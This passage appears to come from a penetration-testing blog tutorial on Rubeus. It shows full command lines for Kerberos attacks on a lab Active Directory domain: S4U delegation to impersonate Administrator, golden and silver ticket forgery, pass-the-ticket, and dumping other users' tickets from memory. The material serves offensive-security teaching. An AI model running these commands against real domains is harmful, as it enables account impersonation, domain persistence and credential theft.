![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&ssl=1)
            
**Hash**
            
Rubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a **hash** function and provide a domain using /domain, an account’s name (can be a machine account too) using the/user flag and the password using /password.
            
`rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1`
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&ssl=1)
            
As you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.
            
**S4u**
            
We saw above how we can generate hashes using Rubeus. Now let’s talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link **[here](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)**. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called “Resource-Based Constrained Delegation” which benefits the **msDS-AllowedToActOnBehalfOfAnotherIdentity** option set in the attribute’s editor. Follow the article **[here](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)** for a full attack. In the example below, we’ll use the user noob’s hash and then impersonate Administrator account.
            
- /rc4: flag is used to provide user noob’s account.
            
- /impersonateuser: User that will be impersonated by noob.
            
- /msdsspn: A valid msDS-AllowedToActOnBehalfOfAnotherIdentity value for the account. Here, the domain controller
            
- /altservice: can be supplied to substitute one or more service names in the resulting .kirbi file.
            
- /ptt: Injects the resulting ticket in the current terminal session
            
`rubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt`
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&ssl=1)
            
This would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&ssl=1)
            
### Golden Ticket
                
Golden tickets are forged KRBTGTs (Key Distribution Service account) which can be used to forge other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article **[here](https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/)**.
                
To forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,
                
- /ldap: Retrieves information of user over LDAP protocol
                
- /user: Username whose ticket will be forged
                
- /printcmd: displays a one liner command that can be used to generate the ticket again that just got generated
                
`rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1`
                
`rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd`
                
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&ssl=1)
                
As you can see various details like SID, userID, Service Key etc are being fetched over LDAP which are important to generate a ticket. PAC signing is also done and a TGT generated for harshitrajpal
                
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&ssl=1)
                
Also, at the end you’ll see a one liner command that can be used to generate this TGT again.
                
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&ssl=1)
                
Various other options can be used in conjunction with golden to modify the generated TGT like:
                
- /rangeinterval: After every time specified, a new ticket will be generated.
                
- /rangeend: Specifies the maximum time tickets will be generated for. Here, 5 days. Since rangeinterval is 1d, 5 different tickets will be generated.
                
For a full list of modifications, see [this](https://github.com/GhostPack/Rubeus#ticket-forgery) page.
                
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&ssl=1)
                
### Silver Ticket
                
Silver tickets are forged Kerberos Ticket Granting Service (TGS) Tickets but with silver tickets there is no communication with the domain controller. It is signed by the service account configured with an SPN for each server the Kerberos-authenticating service runs on. For more details visit the page **[here](https://adsecurity.org/?p=2011)**.
                
Silver ticket attack can be performed using Rubeus using silver function. Other customisations need be made like:
                
- /service: SPN of the service ticket is being generated for
                
- /rc4: Hash of a valid user (harshitrajpal here) which will be used to encrypt the generated ticket
                
- /user: username of the user whose hash is provided
                
- /creduser: User to be impersonated
                
- /credpassword: Password of the user to be impersonated
                
- /krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.
                
- /krbenctype: type of encrypted hash used. Aes256 here.
                
`rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1`
                
`rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt`
                
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&ssl=1)
                
This helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine’s C drive
                
`dir \\dc1.ignite.local\c$`                
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&ssl=1)
 
### Ticket Management
            
Rubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.
            
**Ptt**
            
The Rubeus ptt option can import the supplied ticket in command line. The /ptt can also be used in conjunction with other options that output tickets. For example,
            
`rubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==`
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&ssl=1)
            
As you can see, the generated ticket has now been imported.
            
**Purge**
            
Rubeus has a purge option which can purge/delete all the tickets existing in the current session.
            
Here, we demonstrate how we purged 2 tickets listed by klist.
            
`rubeus.exe purge`
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&ssl=1)
            
**Describe**
            
Often we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.
            
We can provide the ticket using /ticket flag.
            
`rubeus.exe describe /ticket:doIFNDCCBTCg...bA==`
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&ssl=1)
            
**Triage**
            
While klist views tickets for current session triage lists all the tickets. When a session is being run as an administrator, we can not only view tickets in the current user’s session memory but other user’s tickets in memory too.
            
- /luid: This flag can be used to provide a specific user ID.
            
`rubeus.exe triage`            
`rubeus.exe triage /luid:*0x8f57c*`
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&ssl=1)
            
Also, when the LUID is known, we can purge particular user’s tickets too (elevated mode only)
            
`rubeus.exe purge /luid:*0x8f57c*`
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&ssl=1)
            
**Dump**
            
If the session is running in an elevated mode, a user can dump/ extract all the current TGTs and service tickets. Again, /luid can be provided to dump specific user’s tickets. /service can be used to filter these tickets.
            
For example, /service:krbtgt displays only TGTs.
            
`rubeus.exe dump`
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&ssl=1)


Next part I'll work on the mitigation bit as it's own unit hope you learnt a few bit on the read ... 😊   